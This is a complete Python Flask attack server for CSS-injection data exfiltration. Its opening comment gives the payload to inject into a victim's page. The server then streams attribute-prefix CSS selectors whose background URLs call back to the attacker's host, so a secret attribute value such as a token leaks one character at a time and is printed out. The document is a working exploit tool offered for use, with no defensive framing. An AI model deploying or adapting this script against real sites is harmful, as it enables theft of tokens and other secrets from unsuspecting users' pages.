#!/usr/bin/python3
#
# The following payload needs to be intected into the victim's document:
#
# <link rel="stylesheet" href="http://127.0.0.1:8080/evil.css">
# <meta http-equiv="refresh" content="0">
#

import logging
import string

from argparse import ArgumentParser
from flask import Flask, Response, abort, request


args = None
app  = None
# Default to base64
alphabet = string.ascii_letters + string.digits + "+/-_="
secret = ''
last_call = None


def evil():
    '''GET /evil.css
    Returns the CSS that will reveal character the next character.
    '''
    global last_call

    if last_call == evil:
        app.logger.info('Done reading, shutting down')
        request.environ.get('werkzeug.server.shutdown')()
    last_call = evil

    def stream():
        for c in alphabet:
            yield f'{args.selector}[{args.attribute}^="{secret}{c}"] {{ background: url("http://{args.public_address}/reveal?c={c}"); }}\n'

    return Response(stream(), mimetype='text/css')


def reveal():
    '''GET /reveal
    Called when the next char is revealed.
    '''
    global last_call, secret
    last_call = reveal
    c = request.args.get('c')
    secret += c
    app.logger.info(f'secret = {secret}')
    abort(404)


def server():
    global app
    app = Flask(__name__)

    #app.logger.setLevel(logging.DEBUG)

    app.add_url_rule('/evil.css',  view_func=evil,   methods=['GET'])
    app.add_url_rule('/reveal',    view_func=reveal, methods=['GET'])

    (host, port) = args.bind_address.split(':')
    app.run(host=host, port=port, threaded=True)


def parse_args():
    parser = ArgumentParser()

    parser.add_argument('-l', '--bind-address', default='127.0.0.1',
                        help="host[:port] to bind to")
    parser.add_argument('-L', '--public-address',
                        help="host[:port] presented to the victim")
    parser.add_argument('-s', '--selector', required=True,
                        help="CSS selector for the element to read")
    parser.add_argument('-a', '--attribute', required=True,
                        help="name of the attribute to read")

    args = parser.parse_args()

    if ':' not in args.bind_address:
        args.bind_address += ':8080'

    # Public address is same as bind address by default
    if args.public_address is None:
        args.public_address = args.bind_address

    return args


def main():
    global args
    args = parse_args()
    server()
    print(secret)


if __name__ == '__main__':
    main()
